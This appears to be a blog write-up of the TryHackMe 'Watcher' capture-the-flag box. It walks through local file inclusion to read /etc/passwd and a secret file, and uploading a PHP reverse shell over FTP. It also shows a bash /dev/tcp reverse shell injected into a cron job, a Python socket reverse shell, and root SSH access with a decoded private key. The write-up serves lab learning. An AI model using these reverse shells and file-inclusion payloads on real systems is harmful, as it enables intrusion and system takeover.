---
layout: post
title: Watcher Write-Up
comments: true
---
[The Watcher](https://tryhackme.com/room/watcher)  is a medium-difficulty box on the service TryHackMe, and this will be my first of many write-ups to come. I learned a lot from completing this box, and highly recommend any beginner-to-intermediate hackers complete it. Feel free to email me about any questions or recommendations you may have.

When approching a machine, our first step is to use `nmap` to see what is running on the server:
`nmap -sV 10.10.130.17`
When this command is run, the first thing we'll notice is the http server, and secondly you'll see the ftp server.

Let's take a look at the http server: we'll want to take a look at the website. This website looks like a blog. First, we look at the URL and see that this blog uses php to access posts - we'll come back to this later.
Next, we use `gobuster` to fuzz the directories of the machine (alternatively, dirbuster or ffuf can be used if preferred):
`gobuster dir -u 10.10.130.17 -w /usr/share/wordlists/dirb/common.txt`

After this command is run, we'll see there's a file named 'robots.txt'. When looking at `10.10.130.17/robots.txt`, we find 'flag_1' and 'secret_file_do_not_read.txt'.
Congrats, we have our first flag!

Now, lets try and open 'secret_file_do_not_read.txt'. We don't have permission to open this file, but maybe we can bypass this.
Let's open a blog post again. In the url of the posts we have:
"http://10.10.130.17/post.php?post=&lt;postname>.php".

The first thing I do when I see a php query is try to view `/etc/passwd` as a test.

"http://10.10.130.17/post.php?post=/etc/passwd"

From this, we can see the file - two users are visible: Mat and Toby.
Now that we know we can view files with this, lets open the secret file.

"http://10.10.130.17/post.php?post=secret_file_do_not_read.txt"

In this file, there is a note to Mat about ftp credentials.
When we sign into the ftp server, we'll see two things: a directory called `files`, and a file named 'flag_2.txt'

We can copy the flag to our local machine with the `get` command, and then view the flag on our local machine.

Now that we have the ability to ftp into the machine, we can spawn a reverse shell with a php script. I use this one specifically: 
[php reverse shell](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php) 

To make this script work, we need to change the IP and port.

In this screenshot, I changed the IP to my ip address, and port to 4444.

Next: we upload the script, sign into the ftp server once again, and `cd` into the files directory. Upload the php file we just modified using 
`put <path to file on local machine>`

Once it's uploaded, we need to find where the file was saved. On the note to Mat, Will says the files are saved in `/home/ftpuser/ftp/files`. Let's go to the file we uploaded using the php URL we used to see this note.

We'll see an error in the code, which in our case is good; this shows our code is uploaded.

Next, we need to listen for the shell to spawn using `nc -lvnp 4444`

Now we see that we have a shell!
To stabilize this shell we can run:
```
/usr/bin/script -qc /bin/bash /dev/null`
control + z to put the shell in the background
stty raw -echo
fg
export TERM=xterm
```

Lets try to find our third flag:
`find / -name flag_3.txt 2>/dev/null`	

If we run 'whoami', we can see that we are www-data.

Next, lets see what commands we can run with sudo using `sudo -l`
After running this command, we can run any other command with the user Toby.
We can use this to see 'flag_4.txt' in Toby's home directory with `sudo -u toby cat /home/toby/flag_4.txt`

In the same directory, there's a file named 'note.txt'; view it with the same command as before, but with 'note.txt' as the file argument instead.
Within the file, it talks about cron jobs.

To view cron tabs, you can run `cat /etc/crontab`.

We can edit the job in /home/toby/jobs/cow.sh and add this line:
`bash -i >& /dev/tcp/10.8.98.192/4444 0>&1`
to create a reverse shell to intercept with `nc`

Once we have the shell, we can cat out 'flag_5.txt' and stabilize the shell as we did earlier.

Next, we'll run in the scripts directory with another nc session listening 
`echo "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('10.8.108.69',9898));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(['/bin/bash','-i']);" > cmd.py`

Here, we can get the next flag in Will's home directory.

After some looking around with the user Will, we'll find a .b64 file in `/opt/backups/key.b64`. With this file, we can use `base64 -d key.b64 > id_rsa` and download it with `python3 -m http.server`

Finally, we can ssh `ssh -i id_rsa root@10.10.193.197`
and cat out flag_7.txt.

Congratulations, flag 7 completed!
